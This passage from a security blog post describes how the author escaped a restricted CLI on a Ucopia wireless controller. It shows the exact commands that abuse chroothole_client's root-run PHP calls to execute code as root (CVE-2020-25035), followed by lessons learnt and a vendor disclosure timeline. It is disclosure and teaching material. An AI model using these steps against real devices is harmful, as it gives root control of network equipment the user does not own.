 4 -rw-r--r-- 1 root root   989 Jul 22 18:45 modifyNativeIP.xml
 4 -rw-r--r-- 1 root root   903 Jul 22 18:45 mysqlSummary.xml
 4 -rw-r--r-- 1 root root  2413 Jul 22 18:45 netstat.xml
 4 -rw-r--r-- 1 root root   717 Jul 22 18:45 nslookup.xml
 4 -rw-r--r-- 1 root root  1010 Jul 22 18:45 passwd.xml
 4 -rw-r--r-- 1 root root  1380 Jul 22 18:45 ping.xml
 4 -rw-r--r-- 1 root root   666 Jul 22 18:45 ps_aux.xml
 4 -rw-r--r-- 1 root root   792 Jul 22 18:45 reboot.xml
 4 -rw-r--r-- 1 root root  3251 Jul 22 18:45 restoreConfiguration.xml
 4 -rw-r--r-- 1 root root   879 Jul 22 18:45 rm.xml
 4 -rw-r--r-- 1 root root   817 Jul 22 18:45 root-view.xml
 4 -rw-r--r-- 1 root root   893 Jul 22 18:45 scp.xml
 8 -rw-r--r-- 1 root root  5860 Jul 22 18:45 security.xml
 4 -rw-r--r-- 1 root root  1449 Jul 22 18:45 service.xml
 4 -rw-r--r-- 1 root root  1009 Jul 22 18:45 showdhcpleases.xml
 4 -rw-r--r-- 1 root root  1172 Jul 22 18:45 showRoute.xml
 4 -rw-r--r-- 1 root root   904 Jul 22 18:45 ssh.xml
 4 -rw-r--r-- 1 root root  2552 Jul 22 18:45 startup.xml
 4 -rw-r--r-- 1 root root  3348 Jul 22 18:45 static_routes.xml
 4 -rw-r--r-- 1 root root   477 Jul 22 18:45 summary.xml
 4 -rw-r--r-- 1 root root   713 Jul 22 18:45 support_access.xml
 4 -rw-r--r-- 1 root root  3669 Jul 22 18:45 syslog.xml
 4 -rw-r--r-- 1 root root  3316 Jul 22 18:45 tcpdump.xml
 4 -rw-r--r-- 1 root root   639 Jul 22 18:45 telnet.xml
 4 -rw-r--r-- 1 root root  2439 Jul 22 18:45 traceroute.xml
 4 -rw-r--r-- 1 root root   494 Jul 22 18:45 troubleshoot.xml
 4 -rw-r--r-- 1 root root  3093 Jul 22 18:45 tunnel.xml
12 -rw-r--r-- 1 root root 12209 Jul 22 18:45 types.xml
 4 -rw-r--r-- 1 root root  1546 Jul 22 18:45 userAgentFilter.xml
 4 -rw-r--r-- 1 root root  2404 Jul 22 18:45 wget.xml
 4 -rw-r--r-- 1 root root  1485 Jul 22 18:45 windowsDomainRegisteredMAC.xml
</code></pre>

<p>Now we understand why <code>less</code> or <code>wget</code> commands were protected : these were not, as
supposed, the host shell commands but encapsulated calls with parameter filtering.</p>

<p>Let&rsquo;s take a look to the definition of a clish command that needs to write on the
host OS, and hence pass through the chroot hole. Take for example <code>dnsSetServers</code>.</p>

<pre><code>$ cat /etc/clish/dnsSetServers.xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;CLISH_MODULE xmlns=&quot;http://clish.sourceforge.net/XMLSchema&quot;
                xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
                xsi:schemaLocation=&quot;http://clish.sourceforge.net/XMLSchema
                                    http://clish.sourceforge.net/XMLSchema/clish.xsd&quot;&gt;

        &lt;COMMAND name=&quot;dnsSetServers&quot; help=&quot;Configure the DNS servers&quot;&gt;
                &lt;PARAM name=&quot;dnsserver1&quot;
                                help=&quot;The primary DNS server&quot;
                                prefix=&quot;--dns1&quot;
                                ptype=&quot;IP_ADDR&quot;/&gt;
                &lt;PARAM name=&quot;dnsserver2&quot;
                                help=&quot;The secondary DNS server&quot;
                                prefix=&quot;--dns2&quot;
                                ptype=&quot;IP_ADDR_NULLABLE&quot;/&gt;
                &lt;ACTION&gt;
                        chroothole_client &quot;/usr/bin/php /var/www/html/admin/conf/dnsserver.php --dns1='${dnsserver1}' --dns2='${dnsserver2}'&quot;
                &lt;/ACTION&gt;
        &lt;/COMMAND&gt;
&lt;/CLISH_MODULE&gt;
</code></pre>

<p>Now look at this <em>beauty</em>. We&rsquo;re learning here that the chroothole is actually calling for a php script to do
its dirty job. This may not makes sense to you if you don&rsquo;t know what Ucopia wireless controllers are,
but to make it quick, it&rsquo;s main intended configuration interface is a web application, obviously a php
one. I guess they added the CLI much later in the development of the product, which explains the apparent
lack of maturity of its security layer and the fact that most commands from the CLI will rely on the php
scripts that are actually doing the configuration.</p>

<p>What we learn from this, too, is that we are calling for binaries outside the chroot (duh !), so maybe
we could use this to call for other binaries.</p>

<hr />

<p><details>
<summary>Wrong path again&hellip; </summary>
It seems like <code>chroothole_client</code> is filtering the commands we pass to it. I guess I
could bruteforce all the commands to find out which one are allowed and maybe find something usefull to
break of of the chroot,</p>

<pre><code>$ /usr/bin/chroothole_client &quot;/usr/bin/whoami&quot;
$ /usr/bin/chroothole_client &quot;/bin/id&quot;
$ /usr/bin/chroothole_client &quot;/bin/echo 1&quot;
$ /usr/bin/chroothole_client &quot;which bash&quot;
$ /usr/bin/chroothole_client &quot;/usr/bin/which bash&quot;
</code></pre>

<p><em>No output probably means the chroothole silently fails</em>
</details></p>

<hr />

<p>What did I miss ? Something should have stabbed me right in the eye, obvious as it is, but
it took me some time to actually understand what I was looking at.</p>

<ul>
<li><code>chroothole_client</code> is calling for <code>php</code> to do system configuration.</li>
<li>So <code>php</code> can write on the filesystem, and even configuration files.</li>
<li>So <code>php</code> most likely runs as <code>root</code>.</li>
<li>And it seems like I can pass any file as a parameter to the chrootholed <code>php</code> call, even ones I make and upload in my
<code>~/data/</code> directory.</li>
</ul>

<p>Could it be that &hellip;</p>

<h1 id="cve-2020-25035-abritrary-code-execurtion-using-root-privileges-by-exploiting-chroothole-client-s-call-to-root-running-php">CVE 2020-25035 Abritrary code execurtion using root privileges by exploiting chroothole_client&rsquo;s call to root-running php</h1>

<p>Let&rsquo;s try this out. We could upload a complex PHP script to run, like an admin panel, a backdoor
or quite anything, but let&rsquo;s keep it simple and use what we learnt.</p>

<p>Create a php script using <code>sh</code>&rsquo;s echo and flow redirection :</p>

<pre><code>$ echo '&lt;?php system(&quot;whoami&quot;); ?&gt;' &gt; data/test.php
$ cat data/test.php
&lt;?php system(&quot;whoami&quot;); ?&gt;
</code></pre>

<p>A simple system call to <code>whoami</code>, if it works as intended, will tell us if we&rsquo;re indeed running php
as root, if php is capable of making system calls, and if it has the correct environmental
variables to ease our way of exploiting it.</p>

<p>As we have seen earlier (attempted exploit of chrooted rbash), we can only write in our <code>~/data/</code> directory.
Right, that&rsquo;s no big deal, as long as we can write somewhere easily. But where, from the host system point of
view, is located this directory ? We need this answer as our call to php needs the absolute path to the script.</p>

<p>We already know that our chroot is running somewhere under <code>/var/chroot/</code>. Looking at past CVE, namely
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11322">CVE-2017-11322</a> we learn that another binary is available :
<code>/usr/bin/status</code></p>

<p>What is nice with <code>status</code> is that it tries to stat the first parameter, so we can use it to try to
pinpoint our <code>data</code> directory location by using wildcards for completion. We&rsquo;ll start looking under
<code>/var/chroot/</code> and see if we recognize the directory structure there :</p>

<pre><code>$ chroothole_client '/usr/sbin/status /var/chroot/*'
/var/chroot/bin is not running ... failed!
$ chroothole_client '/usr/sbin/status /var/chroot/h*'
/var/chroot/home is not running ... failed!
$ chroothole_client '/usr/sbin/status /var/chroot/home/a*'
/var/chroot/home/admin is not running ... failed!
$ chroothole_client '/usr/sbin/status /var/chroot/home/admin/da*'
/var/chroot/home/admin/data is not running ... failed!
$ chroothole_client '/usr/sbin/status /var/chroot/home/admin/data/test*'
/var/chroot/home/admin/data/test.php is not running ... failed!
</code></pre>

<p>Here we go, our scripts are located under <code>/var/chroot/home/admin/data/</code>.</p>

<p>Now let&rsquo;s call out previously created test.php file through the chrootholed php :</p>

<pre><code>$  /usr/bin/chroothole_client '/usr/bin/php /var/chroot/home/admin/data/test.php'
root
</code></pre>

<h1 id="what-did-we-learn">What did we learn</h1>

<p>So, there are numerous things we learnt here :</p>

<ul>
<li>Designing a chrooted environment with system-write access is, at best, a high ante bet</li>
<li>Designing it off-hand to use existing web-based compenents is worst</li>
<li>Running php as root is still a bad idea</li>
<li>Though multiples layers of security might seem better, it may also lead to multiple ways to defeat it all</li>
<li>Never Trust User Input</li>
<li>Forcing the user to set a strong admin password si great, having your system actually change it is better.</li>
</ul>

<h1 id="timeline">Timeline</h1>

<ul>
<li>August 15th 2020 : Discovery of these exploits</li>
<li>August 24th 2020 : Initial contact with vendor</li>
<li>August 31rd 2020 : CVE number registration</li>
<li>September 28th 2020 : Received vendor&rsquo;s GPG public key for secure communication</li>
<li>October 10th 2020 : Exploits accepted by vendor</li>
<li>Januray 21rd 2021 : Rollout of corrected version from vendor</li>
</ul>

    
</div>

    
<div class="footer">


    
        <div class="tags">
            <i class="fa fa-tags"></i>
            <div class="links">
                
                    
                    
                    <a href="https://blog.globadis.com/tags/cve/">Cve</a>
                    
                
                    
                    
                    <a href="https://blog.globadis.com/tags/netsec/">Netsec</a>
                    
                
                    
                    
                    <a href="https://blog.globadis.com/tags/deep-dive/">Deep Dive</a>
                    
                
            </div>
        </div>
    

    
</div>

</article>

        
    </div>

    
        <div id="comments-container">
            
            
    <script defer src="https://commento.lednerb.de/js/commento.js"></script>
    <div id="commento"></div>


        </div>
    

    </div>

    
<footer>
    <div class="container">

        
        <div class="recent-posts">
            <strong>Latest posts</strong>
            <ul>
                
                <li>
                    <a href="https://blog.globadis.com/blog/ucopia-v6-multiple-cves-root/">Ucopia V6 : Multiple CVE used to root the host</a>
                </li>
                
                <li>
                    <a href="https://blog.globadis.com/blog/localisio-app/">Localisio App</a>
                </li>
                
                <li>
                    <a href="https://blog.globadis.com/blog/localisio-web/">Localisio : a web service to locate public amenities</a>
                </li>
                
                <li>
                    <a href="https://blog.globadis.com/blog/psk-generator/">PSK Generator</a>
                </li>
                
                <li>
                    <a href="https://blog.globadis.com/blog/hello-world/">Hello World</a>
                </li>
                
            </ul>
        </div>
        

        

        <div class="right">
            
            <div class="external-profiles">
                <strong>Social media</strong>

                
                <a href="https://twitter.com/Maschnu" target="_blank"><i class="fab fa-twitter"></i></a>
                
                <a href="https://github.com/BaptisteRichard" target="_blank"><i class="fab fa-github"></i></a>
                
            </div>
            

            
        </div>
    </div>
</footer>


<div class="credits">
    <div class="container">
        <div class="copyright">
            <a href="https://github.com/BaptisteRichard" target="_blank">
                &copy;
                
                2021
                
                by Globadis
            </a>
            
        </div>
        <div class="author">
            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
                target="_blank">Bilberry Hugo Theme</a>
        </div>
    </div>
</div>


    

    


    <script type="text/javascript" src="https://blog.globadis.com/theme.js"></script>

    
    
    

    
</body>

</html>
